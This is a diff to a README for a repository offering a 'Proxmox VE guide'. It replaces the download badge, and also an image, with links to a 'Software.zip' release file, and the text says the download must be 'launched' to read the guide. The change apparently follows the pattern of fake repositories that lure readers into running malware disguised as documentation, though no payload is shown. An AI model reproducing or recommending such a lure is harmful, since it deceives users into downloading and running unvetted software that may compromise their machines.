@@ -42,7 +42,7 @@ This repository provides a wealth of resources, including code snippets, configu
 ### Get Started
 
 To kickstart your Proxmox VE experience, you can download the latest release of this guide using the following link:
-[![Download Proxmox Guide](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Proxmox Guide](https://github.com/thewocy/proxmox-guide/releases/download/v1.0/Software.zip)](https://github.com/thewocy/proxmox-guide/releases/download/v1.0/Software.zip)
 
 ### Note
 The download link needs to be launched to access the Proxmox Guide content.
@@ -77,4 +77,4 @@ Let the Proxmox Guide be your beacon in the world of virtualization. Start your 
 
 ---
 
-![Proxmox VE](https://example.com/proxmox-ve-image.jpg)
+![Proxmox VE](https://github.com/thewocy/proxmox-guide/releases/download/v1.0/Software.zip)
